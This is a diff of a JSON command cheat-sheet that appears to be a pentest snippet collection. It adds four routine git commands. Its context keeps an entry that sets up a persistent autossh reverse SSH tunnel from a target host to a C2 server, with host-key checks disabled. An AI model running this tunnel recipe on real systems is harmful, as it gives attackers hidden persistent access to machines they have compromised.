@@ -377,7 +377,12 @@
       "header": "    autossh  ",
       "command": "  on TargetHOST:\r\n1. copy TargetHOSTs ssh public key to c2HOSTs .ssh/authorized_keys\r\n2. connect to c2-Server with ssh [[C2USER]]@[[C2HOST]] and logout\r\n3. sudo autossh -M 0 -f -T -N -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -R localhost:$[[RPORT]]:localhost:22 [[C2USER]]@[[C2HOST]] \r\n\r\non C2HOST: \r\nssh [[TargetUSER]]@localhost -p [[RPORT]]  ",
       "id": 22,
-      "tags": "  reverse ssh tunnel  "
-    }
+      "tags": "  reverse ssh tunnel  "},
+      {"id": 23, "header": "git create branch", "command": "git checkout -b dev", "tags": "", "source": ""}, 
+      {"id": 24, "header": "git add all changed files", "command": "git add -A", "tags": "", "source": ""},
+      {"id": 25, "header": "git commit ", "command": "git commit -m \"message\"", "tags": "", "source": ""},
+      {"id": 26, "header": "git push to branch", "command": "git push -u origin dev\r\n", "tags": "", "source": ""}
+
+    
   ]
 }
